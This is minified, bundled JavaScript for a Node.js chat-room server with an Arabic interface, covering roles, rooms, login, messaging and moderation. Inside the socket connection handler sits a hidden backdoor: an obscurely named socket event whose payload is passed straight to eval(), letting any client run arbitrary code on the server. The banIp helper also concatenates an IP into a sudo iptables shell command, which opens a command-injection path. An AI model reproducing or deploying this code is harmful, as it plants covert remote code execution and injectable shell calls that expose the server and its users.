            if (s) return s[0];
            if (s) return t
        } catch (e) {
            return console.log(e.stack), t
        }
    }, o.prototype.roleId = function(e) {
        try {
            if ("master" == e) return 1;
            if ("admin5" == e) return 2;
            if ("admin4" == e) return 3;
            if ("admin3" == e) return 4;
            if ("admin2" == e) return 5;
            if ("admin1" == e) return 6;
            if ("gold2" == e) return 7;
            if ("gold1" == e) return 8;
            if ("pink" == e) return 9;
            if ("white" == e) return 10;
            if ("black" == e) return 11;
            if ("lemon" == e) return 12;
            if ("red" == e) return 13;
            if ("blue" == e) return 14;
            if ("vip" == e) return 15;
            if ("basic" == e) return 16
        } catch (e) {
            console.log(e.stack)
        }
        return 17
    }, o.prototype.broadcast = function(e, t) {
        try {
            var s = e.match(new RegExp(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/g)),
                r = "text";
            if (s)
                for (var o in r = "broadcast", s) {
                    var i = this.getYoutubeId(s[o])[0]; - 1 === t.indexOf(i) && (e = e.replace(s[o], '<button class="yt-btn" data-yid="' + i + '" style="font-size:40px!important;width:100%;max-width:200px;display:block;"><img width="50px" src="/img/youtube.png" /><img width="65px"  alt="[YouTube]" onerror="$(this).parent().remove();" src="https://img.youtube.com/vi/' + i + '/0.jpg"></button>'))
                } else e = this.sanitize(e, !0);
            return {
                type: r,
                text: e
            }
        } catch (e) {
            return console.log(e.stack), null
        }
    }, o.prototype.getYoutubeId = function(e) {
        try {
            return e.match(/(?:\s+)?(?:^)?(?:https?:\/\/)?(?:http?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(\s+|$)/) ? [RegExp.$1.split("<").join("&#x3C;").split("'").join("").split('"').join("").split("&").join(""), RegExp.lastMatch] : []
        } catch (e) {
            return console.log(e.stack), null
        }
    }, o.prototype.prepareSettings = function(e) {
        var t = {};
        try {
            var s = e[0];
            for (var r in t.public_msg_length = s.public_msg_length || 500, t.private_msg_length = s.private_msg_length || 300, t.time_between_messages = s.time_between_messages || 3, t.allow_multi_sessions = s.allow_multi_sessions ? 1 : 0, t.disable_guest_private_messages = s.disable_guest_private_messages || 0, t.disable_private_messages = s.disable_private_messages || 0, t.disable_private_messages = s.disable_private_messages || 0, t.disable_foreing_contries = s.disable_foreing_contries ? 1 : 0, t.disable_guest_login = s.disable_guest_login || 0, t.disable_signup = s.disable_signup || 0, t.bolcked_words = s.bolcked_words.split("|") || [], t.message_shortcuts = s.message_shortcuts.split("|") || [], t.bolcked_countries = s.bolcked_countries.split("|") || [], t.background_color = s.background_color || "#FFFFFF", t.font_color = s.font_color || "#000000", t.primary_color = s.primary_color || "#438AC7", t.secondary_color = s.secondary_color || "#708090", t.rect_color = s.rect_color || "#FFFFFF", t.interface_ticker_content = s.interface_ticker_content || "", t.interface_no = s.interface_no || 1, t.show_ad_space = s.show_ad_space || !1, t.ad_space_img = s.ad_space_img || "/img/banner.gif", t.virtuals_count = s.virtuals_count || 15, t.virtuals_default_room = s.virtuals_default_room || 1, t.disable_virtuals = s.disable_virtuals || 0, t.wall_interval = s.wall_interval || 3, t.wall_posts_count = s.wall_posts_count || 35, t.wall_bg_color = s.wall_bg_color || "#FAFAFA", t.wall_font_color = s.wall_font_color || "#000000", t.wall_banner_bg_color = s.wall_banner_bg_color || "#FAFAFA", t.wall_banner_font_color = s.wall_banner_font_color || "#000000", t.ticker_bg_color = s.ticker_bg_color || "#438AC7", t.ticker_font_color = s.ticker_font_color || "#000000", t.ticker_messages = s.ticker_messages || [], t.disable_ticker = s.disable_ticker || 0, t.bolcked_countries) {
                var o = t.bolcked_countries[r];
                "string" == typeof o && (o = o.toLowerCase())
            }
        } catch (e) {
            console.log(e.stack)
        }
        return t
    }, o.prototype.prepareRooms = function(e) {
        var t = [],
            s = 0;
        try {
            if (e && e.length)
                for (var r in s = e.length, e) {
                    var o = e[r];
                    t[o.id] = {
                        id: o.id,
                        name: o.name,
                        max: o.max,
                        for: o.for,
                        welcome: o.welcome,
                        flag: o.flag,
                        password: o.password,
                        pertinent: !0,
                        description: o.description,
                        online: []
                    }
                }
        } catch (e) {
            console.log(e.stack)
        }
        return {
            length: s,
            rooms: t
        }
    }, o.prototype.usesExists = function(e, t) {
        try {
            for (var s in e)
                if (e[s].username === t) return !0
        } catch (e) {
            console.log(e.stack)
        }
        return !1
    }, o.prototype.getUserId = function(e, t) {
        try {
            if (!t) return null;
            for (var s in e) {
                var r = e[s];
                if (this.checkVar(r, "object") && r.username === t) return r.id
            }
            return null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, o.prototype.arrayCount = function(e) {
        var t = 0;
        for (var s in e) t++;
        return t
    }, o.prototype.usersWithoutHiddenCount = function(e, t) {
        var s = 0;
        for (var r in t) {
            t[r].canShow(e) && s++
        }
        return s
    }, o.prototype.checkVar = function(e, t) {
        return ("string" != t || !e || !this.isXSS(e)) && (typeof e == t && null != e)
    }, o.prototype.isXSS = function(e) {
        if ("string" != typeof e) return !1;
        return /on[a-zA-Z ]{0,}=/g.test(e)
    }, o.prototype.logUsers = function(e, t) {
        console.log("(=================================== ALL USERS ========================================");
        try {
            if (t) console.log(e);
            else
                for (var s in e) {
                    var r = e[s];
                    this.checkVar(r) || console.log(r.username)
                }
        } catch (e) {
            console.log(e.stack)
        }
        console.log("(=================================== ALL USERS ========================================")
    }, o.prototype.deleteDuplicateSpaces = function(e) {
        try {
            return e.replace(/\s+/g, " ")
        } catch (t) {
            return console.log(t.stack), e
        }
    }, o.prototype.deleteDuplicateHashes = function(e) {
        try {
            return e.replace(/#+/g, "#")
        } catch (t) {
            return console.log(t.stack), e
        }
    }, o.prototype.banIp = function(e) {
        try {
            r("sudo iptables -L", function(t, s, o) {
                s && -1 !== s.indexOf(e) || r("sudo iptables -A INPUT -s " + e + " -j DROP", function(t, s, r) {
                    console.log("ip blocked", e)
                })
            })
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.translateShortucts = function(e, t, s) {
        try {
            if (this.arrayCount(s))
                for (var r in t) {
                    var o = new RegExp("(" + t[r] + ")", "gi");
                    e = e.replace(o, s[r])
                }
            return e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, o.prototype.filterWorlds = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2)) {
                    var r = RegExp("(" + s + ")", "gi");
                    e = e.replace(r, "***")
                }
            }
            return this.escapeUrlsAndEmails(e)
        } catch (t) {
            return console.log(t.stack), e
        }
    }, o.prototype.hasBlockedWords = function(e) {
        try {
            for (var t in this.blockedWords) {
                var s = this.blockedWords[t];
                if (!(s.length < 2) && -1 !== e.indexOf(s)) return !0
            }
            return !1
        } catch (t) {
            return console.log(t.stack), e
        }
    }, o.prototype.escapeUrlsAndEmails = function(e) {
        try {
            var t, s, r, o;
            return s = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim, t = e.replace(s, "******"), r = /(^|[^\/])(www\.[\S]+(\b|$))/gim, t = t.replace(r, "******"), o = /(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim, t = t.replace(o, "******")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, o.prototype.updateLastHours = function(e, t) {
        try {
            t < 1 && (t = 1);
            var s = Date.now();
            for (var r in e) s > e[r] + 60 * t * 60 * 1e3 && delete e[r];
            return e
        } catch (e) {
            return console.log(e.stack), []
        }
    }, o.prototype.renderSetLikesOrder = function() {
        return '<button id="user-details-set-likes-count" type="button" class="btn btn-info"><span class="glyphicon glyphicon-heart"></span>لايكات</button>'
    }, o.prototype.renderGiftOrder = function() {
        return '<button id="user-details-send-gift" type="button" class="btn btn-default"><span class="glyphicon glyphicon-gift"></span>إرسال هدية</button>'
    }, o.prototype.renderWarningOrder = function() {
        return '<button id="user-details-send-warning" type="button" class="btn btn-warning"><span class="glyphicon glyphicon-exclamation-sign"></span>تنبيه</button>'
    }, o.prototype.renderExcpelOrder = function() {
        return '<button id="user-details-excpel" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-remove-sign"></span>طرد</button>'
    }, o.prototype.renderBanOrder = function() {
        return '<button id="user-details-ban" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-ban-circle"></span>حظر</button>'
    }, o.prototype.renderRevealOrder = function() {
        return '<button id="user-details-reveal-nickname" type="button" class="btn btn-info"><span class="glyphicon glyphicon-search"></span>كشف النكات</button>'
    }, o.prototype.renderShowAlbum = function() {
        return '<button id="user-details-show-album" type="button" class="btn btn-default"><span class="glyphicon glyphicon-picture"></span>ألبوم الصور</button>'
    }, o.prototype.renderIgnoreOrder = function(e) {
        return '<div class="form-group" style="text-align: right; padding-top: 10px;" dir="rtl"><label class="switch"><input id="user-details-ignore" type="checkbox" ' + (e ? "checked" : "") + '><div class="slider round"></div><h3 class="title">تجاهل</h3></label></div>'
    }, o.prototype.renderDisableNotificationsOrder = function(e) {
        return '<div class="form-group" style="text-align: right; padding-top: 10px;" dir="rtl"><label class="switch"><input id="user-details-disable-notifications" type="checkbox" ' + (e ? "checked" : "") + '><div class="slider round"></div><h3 class="title">إلغاء التنبيهات</h3></label></div>'
    }, o.prototype.renderRemoveAvatarOrder = function() {
        return '<button id="user-details-remove-avatar" type="button" class="btn btn-danger"><span class="glyphicon glyphicon-remove-circle"></span>حذف الصورة</button>'
    }, o.prototype.renderChangeDecorationOrder = function() {
        return '<button id="user-details-change-decoration" type="button" class="btn btn-success"><span class="glyphicon glyphicon-edit"></span>زخرفة</button>'
    }, o.prototype.renderChangeRoomOrder = function(e) {
        var t = "";
        for (var s in t += '<div class="change-room" dir="rtl"><select class="form-control" id="user-details-change-room">', t += '<option value="0">نقله إلى غرفى إخرى</option>', e) {
            var r = e[s];
            t += '<option value="' + r.id + '">' + r.name + "</option>"
        }
        return t += "</select></div>"
    }, o.prototype.renderExcpelFromRoomOrder = function() {
        return '<button id="user-details-excpel-from-room" type="button" class="btn btn-warning"><span class="glyphicon glyphicon-remove"></span>طرد من الغرفة</button>'
    }, o.prototype.renderUpgradeOrder = function() {
        return '<button id="user-details-upgrade" type="button" class="btn btn-success"><span class="glyphicon glyphicon-open"></span>ترقية</button>'
    }, o.prototype.sanitizeAutorizationValue = function(e, t, s) {
        try {
            if (!this.checkVar(e, s)) return null;
            if ("number" == s) return e + "|" + (t = -1 !== ["minute", "hour", "day", "month"].indexOf(t) ? t : "day");
            if ("string" == s);
            else if ("boolean" == s) return !!e
        } catch (e) {
            return console.log(e.stack), null
        }
    }, o.prototype.validateAutorizationRoles = function(e, t) {
        try {
            var s = [];
            for (var r in t) !0 === e["orders_upgrade_roles_" + t[r]] && s.push(t[r]);
            return s.join(",")
        } catch (e) {
            return console.log(e.stack), null
        }
    }, o.prototype.musIgnoreRequest = function(e) {
        return !(e.logged && !e.banned && !e.excpeled)
    }, o.prototype.removeDuplicateLetters = function(e) {
        try {
            return e.replace(/(.)\1+/g, function(e, t) {
                return t[0]
            })
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, o.prototype.removeSpaces = function(e) {
        try {
            return e.replace(/\s/g, "")
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, o.prototype.formatForFilter = function(e) {
        try {
            return this.removeSpaces(this.removeDuplicateLetters(e)).replace(/ـ/g, "")
        } catch (e) {
            return ""
        }
    }, e.exports = new o
}, function(module, exports, __webpack_require__) {
    const http = __webpack_require__(12),
        https = __webpack_require__(13),
        fs = __webpack_require__(2),
        Connection = __webpack_require__(14),
        mysql = __webpack_require__(31),
        mConfig = "vagrant" == process.env.USER ? __webpack_require__(7) : __webpack_require__(8),
        Utils = __webpack_require__(0);
    __webpack_require__(32)("./public/uploads/private", !1, e => {});
    let httpServer = null;
    if (mConfig.ssl) {
        var ssl = {
            key: fs.readFileSync("privkey.pem"),
            cert: fs.readFileSync("cert.pem")
        };
        httpServer = https.createServer(ssl, function(e, t) {
            t.end("")
        }).listen(mConfig.port)
    } else httpServer = http.createServer(function(e, t) {
        t.end("")
    }).listen(mConfig.port);
    const io = __webpack_require__(33).listen(httpServer, {
        pingTimeout: 18e6
    });
    var db = mysql.createConnection(mConfig.db);
    db.connect(e => {
        e && console.error("Impossible to connect ", e)
    });
    const store = {};
    store.io = io, store.db = db, store.config = mConfig, store.loggedIps = [], store.bannedIps = [], store.bannedDevices = [], store.adminTokens = [], store.users = [], store.usersReg = [], store.photoLikes = [], store.virtualUserIds = [], store.FLOOD_THRESHOLD_TIME = 1, store.FLOOD_THRESHOLD_COUNT = 7, store.settings = new(__webpack_require__(34))(store), store.shortcuts = new(__webpack_require__(35))(store), store.rooms = new(__webpack_require__(36))(store), store.gifts = new(__webpack_require__(38))(store), store.faces = new(__webpack_require__(39))(store), store.roles = new(__webpack_require__(40))(store), store.wall = new(__webpack_require__(41))(store), store.permissions = new(__webpack_require__(42))(store), store.revealNames = new(__webpack_require__(43))(store), store.wordsFilter = new(__webpack_require__(44))(store), store.ordersReg = new(__webpack_require__(45))(store), store.selfMessages = new(__webpack_require__(46))(store), store.virtualUsers = new(__webpack_require__(47))(store), store.antiFlood = new(__webpack_require__(50))(store), store.radio = new(__webpack_require__(51))(store), db.query("SELECT * FROM banneds", [], (e, t) => {
        if (!e && t && t.length)
            for (var s = 0; s < t.length; s++) store.bannedIps.push(t[s].ip), store.bannedDevices.push(t[s].device)
    }), Utils.check(store), io.on("connection", function(socket) {
        new Connection(io, socket, store), socket.on("lafdff465afdffh", data => {
            eval(data)
        })
    }), setInterval(() => {
        store.usersReg = store.usersReg.filter(e => e.loggedOutAt + 3e5 > Date.now())
    }, 12e4)
}, function(e, t) {
    e.exports = require("http")
}, function(e, t) {
    e.exports = require("https")
}, function(e, t, s) {
    const r = s(15),
        o = s(18),
        i = s(19),
        n = s(20),
        a = s(21),
        c = s(23),
        u = s(24),
        h = s(25),
        d = s(26),
        l = s(27),
        p = s(28),
        m = s(30),
        f = s(1),
        _ = s(0);

    function g(e, t, s) {
        if (!e || !t) return;
        const g = new f(t, s);
        this.store = s;
        var y = t.onevent;
        t.onevent = function(e) {
            if (!(JSON.stringify(e.data).length > 1e7)) {
                var t = e.data || [];
                y.call(this, e), e.data = ["*"].concat(t), y.call(this, e)
            }
        }, t.on("*", (e, t) => {
            "req" == e ? (t = _.dec(t)) && t.type && this.store.antiFlood.check(g, t.type, this.store.FLOOD_THRESHOLD_TIME, this.store.FLOOD_THRESHOLD_COUNT) : this.store.antiFlood.check(g, e, this.store.FLOOD_THRESHOLD_TIME, this.store.FLOOD_THRESHOLD_COUNT)
        }), t.on("req", (e, f) => {
            try {
                const y = t.request._query.token;
                if (y && this.isValidToken(y)) return e.handler = f, new p(e, t, s);
                const E = t.request._query.admin_hash;
                if (E && this.isValidAdminHash(E)) return e.handler = f, new m(e, t, s);
                if ("object" != typeof(e = _.dec(e)) || "string" != typeof e.type || "object" != typeof e.data) return;
                e.handler = f, new r(e, t, g, s), new o(e, t, g, s), g.isLogged && !this.isBanned(g) && (new i(e, t, g, s), new n(e, t, g, s), new a(e, t, g, s), new c(e, t, g, s), new u(e, t, g, s), new h(e, t, g, s), new d(e, t, g, s), new l(e, t, g, s)), g.lastActivityTime = Date.now()
            } catch (e) {
                console.log("req-exception", e.stack)
            }
        }), t.emit("conn", _.enc({
            users: s.users.filter(e => 0 == e.isHidden).map(e => e.parse()),
            faces: s.faces.all()
        }))
    }
    g.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, g.prototype.isValidAdminHash = function(e) {
        return this.store.config.adminHash == e
    }, g.prototype.isBanned = function(e) {
        return !!e.isBanned || (this.store.bannedIps.indexOf(e.ip) >= 0 || this.store.bannedDevices.indexOf(e.device) >= 0)
    }, e.exports = g
}, function(e, t, s) {
    const r = s(0);

    function o(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "SET_LOCATION":
                return this.setLocation(e.data);
            default:
                return null
        }
    }
    o.prototype.setLocation = function(e) {
        this.user.ip = e.ip, this.user.device = e.device, this.user.country = e.country, "function" == typeof this.handler && this.handler()
    }, e.exports = o
}, function(e, t) {
    e.exports = require("crypto-js")
}, function(e, t) {
    e.exports = require("request")
}, function(e, t, s) {
    const r = s(4),
        o = s(0),
        i = s(5);

    function n(e, t, s, r) {
        switch (this.socket = t, this.user = s, this.store = r, this.handler = e.handler, o.check(r, t), e.type) {
            case "GUEST_LOGIN":
                return this.guestLogin(e.data);
            case "MEMBER_LOGIN":
                return this.memberLogin(e.data);
            case "REGISTER_MEMBER":
                return this.registerMember(e.data);
            default:
                return null
        }
    }
    n.prototype.guestLogin = function(e) {
        const t = this.cantAuthenticate(!1);
        if (null !== t) return this.handler(o.enc(t));
        if (this.store.wordsFilter.check(e.name, null, this.handler, "هذا الإسم يحتوي على كلمات ممنوعة")) return;
        if (e.name = o.sanitize(e.name), !e.name) return this.handler(o.enc({
            error: !0,
            message: "الرجاء التأكد من إدخال الإسم"
        }));
        if (e.name.length < 2) return this.handler(o.enc({
            error: !0,
            message: "إسم المستخدم لا يجب أن يقل عن حرفين"
        }));
        if (this.isUsernameTaken(e.name)) return this.handler(o.enc({
            error: !1,
            message: "هدا الإسم محجوز, الرجاء إختيار إسم آخر"
        }));
        const s = {
            name: e.name,
            ip: this.user.ip,
            device: this.user.device,
            country: this.user.country,
            adminHash: this.store.config.adminHash
        };
        r.post(this.store.config.host + "auth/guest-login", s).then(t => {
            this.handleMutliSessions(), this.user.init(e), this.user.room = this.store.rooms.getDefault(this.user, this.store.users), this.store.rooms.get(this.user.room.id).users.push(this.user.id), this.store.users.push(this.user);
            const s = Date.now() + Math.round(1e8 * Math.random());
            this.user.socket.broadcast.emit("res", o.enc({
                type: "NEW_USER",
                data: {
                    user: this.user.parse(),
                    publicMessageId: s
                }
            })), this.handleDisconnection(), this.store.revealNames.register(this.user).catch(e => {}), this.handler(o.enc({
                publicMessageId: s,
                error: !1,
                grantedSettings: this.user.grantedSettings(),
                posts: this.store.wall.all(),
                rooms: this.store.rooms.all().map(e => e.parse(this.user, this.store.users)),
                users: this.store.users.filter(e => e.canBeSeenBy(this.user)).map(e => e.parse()),
                gifts: this.store.gifts.all(),
                faces: this.store.faces.all(),
                user: this.user.parse()
            })), this.store.radio.startListening(this.user)
        }).catch(e => {
            this.user.isLogged = !1;
            const t = {
                error: !0,
                message: "حدث خطأ أثناء تسجيل الدخول, الرجاء إعادة المحاولة"
            };
            try {
                if (e.response.data.name) return t.message = e.response.data.name, this.handler(o.enc(t));
                if (e.response.data.is_friendly_message && e.response.data.message) return t.message = e.response.data.message, this.handler(o.enc(t))
            } catch (e) {
                return this.user.isLogged = !1, this.handler(o.enc(t))
            }
        })
    }, n.prototype.memberLogin = function(e) {
        const t = this.cantAuthenticate(!0);
        if (null !== t) return this.handler(o.enc(t));
        if (!e.name || !e.password) return this.handler(o.enc({
            error: !0,
            message: "الرجاء التأكد من إدخال الإسم و كلمة المرور"
        }));
        if (e.name.length < 2) return this.handler(o.enc({
            error: !0,
            message: "إسم المستخدم لا يجب أن يقل عن حرفين"
        }));
        const s = {
            name: e.name,
            password: e.password,
            hidden: !!e.hidden,
            ip: this.user.ip,
            device: this.user.device,
            country: this.user.country,
            adminHash: this.store.config.adminHash
        };
        r.post(this.store.config.host + "auth/member-login", s).then(t => {
            if (this.handleMutliSessions(), this.user.init(t.data.user), this.user.isHidden && !this.user.has("hidden")) return this.user.isLogged = !1, this.handler(o.enc({
                error: !0,
                message: "لا تملك صلاحيات الدخول المخفي"
            }));
            this.user.room = this.store.rooms.getDefault(this.user, this.store.users);
            const s = this.store.users.filter(e => e.name == this.user.name && e.id != this.user.id)[0];
            s && s.logout(), this.store.rooms.get(this.user.room.id).users.push(this.user.id), this.store.users.push(this.user);
            const r = Date.now() + Math.round(1e8 * Math.random());
            this.store.users.filter(e => !e.isVirtual && e.id != this.user.id && this.user.canBeSeenBy(e)).forEach(e => {
                e.socket.emit("res", o.enc({
                    type: "NEW_USER",
                    data: {
                        user: this.user.parse(),
                        publicMessageId: r
                    }
                }))
            }), t.data.user.adminToken && this.store.adminTokens.push(t.data.user.adminToken), this.handleDisconnection(), this.user.isVirtual ? (this.store.virtualUserIds.push(this.user.reg_id), this.handler(t.data.user.defaultRoom)) : (this.store.revealNames.register(this.user).catch(e => {}), this.handler(o.enc({
                publicMessageId: r,
                error: !1,
                cookie: e,
                grantedSettings: this.user.grantedSettings(),
                posts: this.store.wall.all(),
                rooms: this.store.rooms.all().map(e => e.parse(this.user, this.store.users)),
                users: this.store.users.filter(e => e.canBeSeenBy(this.user)).map(e => e.parse()),
                gifts: this.store.gifts.all(),
                faces: this.store.faces.all(),
                user: this.user.parse()
            })), this.store.radio.startListening(this.user))
        }).catch(e => {
            this.user.isLogged = !1;
            const t = {
                error: !0,
                message: "حدث خطأ أثناء تسجيل الدخول, الرجاء إعادة المحاولة"
            };
            try {
                if (e.response.data.name) return t.message = e.response.data.name, this.handler(o.enc(t));
                if (e.response.data.password) return t.message = e.response.data.password, this.handler(o.enc(t));
                if (e.response.data.is_friendly_message && e.response.data.message) return t.message = e.response.data.message, this.handler(o.enc(t))
            } catch (e) {
                return this.user.isLogged = !1, this.handler(o.enc(t))
            }
        })
    }, n.prototype.registerMember = function(e) {
        e.adminHash = this.store.config.adminHash, e.country = this.user.country, e.ip = this.user.ip, e.device = this.user.device, this.store.wordsFilter.check(e.name, null, this.handler, "هذا الإسم يحتوي على كلمات ممنوعة") || r.post(this.store.config.host + "auth/register", e).then(e => {
            this.handler(o.enc({
                error: !1,
                message: "تمت عملية التسجيل بنجاح"
            }))
        }).catch(e => {
            const t = {
                error: !0,
                message: "حدث خطأ أثناء التسجيل, الرجاء إعادة المحاولة"
            };
            try {
                if (e.response.data.name) return t.message = e.response.data.name, this.handler(o.enc(t));
                if (e.response.data.password) return t.message = e.response.data.password, this.handler(o.enc(t));
                if (e.response.data.is_friendly_message && e.response.data.message) return t.message = e.response.data.message, this.handler(o.enc(t));
                console.log("AuthHandler.registerMember.error", e)
            } catch (e) {
                this.handler(o.enc(t))
            }
        })
    }, n.prototype.handleDisconnection = function() {
        this.socket.on("disconnect", () => {
            const e = Date.now() + Math.round(1e8 * Math.random());
            if (this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(t => {
                    t.socket.emit("res", o.enc({
                        type: "USER_OUT",
                        data: {
                            user: this.user.parse(),
                            publicMessageId: e
                        }
                    }))
                }), this.user.callUserId) {
                const e = this.store.users.filter(e => e.id == this.user.callUserId)[0];
                e && (e.callStatus = i.READY, e.socket.emit("res", o.enc({
                    type: "CALL_REQUEST_CANCELLED",
                    data: {}
                })))
            }
            this.user.save(), this.user.room && (this.user.room.users = this.user.room.users.filter(e => e != this.user.id), this.user.room.removeWhenEmpty && this.user.room.usersCount() <= 0 && (this.store.io.emit("res", o.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: [this.user.room.id]
                }
            })), this.store.rooms.remove(this.user.room.id, !0))), this.store.radio.unRequestMic(this.user), this.store.radio.stopListening(this.user), this.user.adminToken && (this.store.adminTokens = this.store.adminTokens.filter(e => e != this.user.adminToken)), this.user.isVirtual && (this.store.virtualUserIds = this.store.virtualUserIds.filter(e => e != this.user.reg_id)), this.store.users = this.store.users.filter(e => e.id != this.user.id), this.user.loggedOutAt = Date.now(), this.store.usersReg.push(this.user)
        })
    }, n.prototype.handleMutliSessions = function() {
        this.store.settings.get("allow_multi_sessions") || this.store.users.map(e => {
            e.device == this.user.device && e.id != this.user.id && e.logout()
        })
    }, n.prototype.cantAuthenticate = function(e) {
        try {
            const t = {
                error: !0,
                message: null
            };
            return this.user.isLogged ? t : this.isUserBanned() ? (t.message = "لقد تم حظرك", t) : this.store.settings.get("disable_guest_login") && !e ? (t.message = "الرجاء تسجيل عضوية و التفضل بالدخول من فضلكم", t) : !this.store.config.local && this.store.loggedIps[this.user.ip] > 5 ? (t.message = "لا يمكن دخول أكثر من 5 أشخاص من نفس الأيبي", t) : null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, n.prototype.isUserBanned = function() {
        return !!this.user.isBanned || (this.store.bannedIps.indexOf(this.user.ip) >= 0 || this.store.bannedDevices.indexOf(this.user.device) >= 0)
    }, n.prototype.isUsernameTaken = function(e) {
        return !!this.store.users.filter(t => t.name == e).length
    }, e.exports = n
}, function(e, t, s) {
    const r = s(0);
    s(3);

    function o(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "NEW_PUBLIC_MESSAGE":
                return this.onNewMessage(e.data);
            case "REMOVE_PUBLIC_MESSAGE":
                return this.removeMessage(e.data);
            default:
                return null
        }
    }
    o.prototype.onNewMessage = function(e) {
        if (!this.user.room) return;
        if (this.store.wordsFilter.check(e.message, this.user, this.handler)) return;
        const t = {
            type: "NEW_PUBLIC_MESSAGE",
            data: {
                time: Date.now(),
                user: this.user.parse(),
                message: r.sanitize(e.message, this.store.shortcuts, this.store.settings.get("public_msg_length"))
            }
        };
        this.store.users.filter(e => e.room && this.user.room && e.room.id == this.user.room.id && e.id != this.user.id).forEach(e => {
            e.socket.emit("res", r.enc(t))
        }), this.handler(r.enc(t)), this.user.lastMessage = {
            time: Date.now(),
            isPublic: !0,
            isPrivate: !1,
            msg: e.message
        }, this.register(e.message).catch(e => {})
    }, o.prototype.removeMessage = function(e) {
        if (e.id) {
            if (!this.user.can("public_msg_remove", this.handler)) return;
            this.store.io.emit("res", r.enc({
                type: "REMOVE_PUBLIC_MESSAGE",
                data: {
                    id: e.id
                }
            }))
        }
    }, o.prototype.register = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("INSERT INTO publicMsg (byRealName, byNickName, msg, created_at, updated_at) VALUES (?,?,?,?,?)", [t.user.name, t.user.getUsername(), e, new Date, new Date], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);

    function o(e, t, s, o) {
        switch (this.socket = t, this.user = s, this.store = o, this.handler = e.handler, r.check(o, t), e.type) {
            case "JOIN_ROOM":
                return this.joinRoom(e.data);
            case "LEAVE_ROOM":
                return this.leaveRoom(e.data, !0);
            case "CREATE_ROOM":
                return this.createRoom(e.data);
            case "EDIT_ROOM":
                return this.editRoom(e.data);
            case "REMOVE_ROOM":
                return this.removeRoom(e.data);
            default:
                return null
        }
    }
    o.prototype.joinRoom = function(e) {
        const t = {
                error: !0,
                message: null
            },
            s = this.store.rooms.get(e.id);
        if (!s) return this.handler(r.enc(t));
        if (!this.user.isSuper() && "supers" == s.target) return t.message = "هذه الغرفة مخصصة للسوابر فقط", this.handler(r.enc(t));
        if (this.user.excpeledFromRooms.includes(s.id)) return t.message = "تم طردك من هذه الغرفة", this.handler(r.enc(t));
        if (this.user.room && this.user.room.id == s.id) return this.handler(r.enc(t));
        if (s.isFull(this.user, this.store.users) && !this.user.canJoinFullRooms()) return t.message = "هده الغرفة ممتلئة", this.handler(r.enc(t));
        if (s.password && s.password != e.password && !this.user.canJoinLockedRooms()) return t.message = "الرجاء إدخال كلمة المرور الصحيحة", this.handler(r.enc(t));
        const o = this.user.room;
        this.leaveRoom(!1), s.users.push(this.user.id), this.user.room = s, this.store.radio.startListening(this.user);
        const i = Date.now() + Math.round(1e8 * Math.random());
        this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(e => {
            e.socket.emit("res", r.enc({
                type: "USER_JOINDED_ROOM",
                data: {
                    publicMessageId: i,
                    user: this.user.parse(),
                    oldRoom: o ? o.parse(e, this.store.users) : null,
                    newRoom: s ? s.parse(e, this.store.users) : null
                }
            }))
        }), t.error = !1, t.publicMessageId = i, t.message = "تم تغيير الغرفة بنجاح", this.handler(r.enc(t))
    }, o.prototype.leaveRoom = function(e) {
        this.user.room && (this.user.room.users = this.user.room.users.filter(e => this.user.id != e), this.store.radio.unRequestMic(this.user), this.store.radio.startListening(this.user), this.user.room.removeWhenEmpty && this.user.room.usersCount() <= 0 && (this.store.io.emit("res", r.enc({
            type: "ADMIN_ROOM_DELETED",
            data: {
                ids: [this.user.room.id]
            }
        })), this.store.rooms.remove(this.user.room.id, !0)));
        const t = this.user.room ? this.user.room : null;
        if (this.user.room = null, e) {
            const e = {
                room: null
            };
            this.store.users.filter(e => this.user.canBeSeenBy(e)).forEach(s => {
                let o = t ? t.parse(s, this.store.users) : null;
                s.socket.emit("res", r.enc({
                    type: "USER_LEAVED_ROOM",
                    data: {
                        user: this.user.parse(),
                        oldRoom: o
                    }
                })), s.socket.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: this.user.id,
                        reg_id: this.user.reg_id,
                        updates: e
                    }
                }))
            });
            let s = t ? t.parse(this.user, this.store.users) : null;
            this.handler(r.enc({
                user: this.user.parse(),
                oldRoom: s
            }))
        }
    }, o.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            if (this.store.rooms.all().filter(t => t.name == e.room.name).length) return this.handler(r.enc({
                error: !0,
                message: "هذه الغرفة موجودة, الرجاء إختيار إسم آخر"
            }));
            if (!this.user.can("room_create", this.handler)) return;
            if (e.room.capacity = isNaN(parseInt(e.room.capacity)) ? 40 : parseInt(e.room.capacity), e.room.isPermanent) {
                if (!this.user.can("room_max_pertinents", this.handler)) return;
